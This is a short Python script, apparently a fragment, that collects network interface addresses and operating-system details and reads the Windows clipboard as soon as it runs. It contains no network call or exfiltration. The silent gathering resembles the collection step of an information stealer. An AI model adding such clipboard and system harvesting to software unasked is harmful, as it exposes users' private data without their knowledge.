import psutil
import os
import platform
import win32clipboard

def get_sys_info():
    ips = psutil.net_if_addrs()
    _os = os.name
    _platform = platform.system()
    return ips, _os, _platform

ips, _os, _platform = get_sys_info()



def get_clipboard():
    win32clipboard.OpenClipboard()
    data = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()
    return data

clipboard = get_clipboard()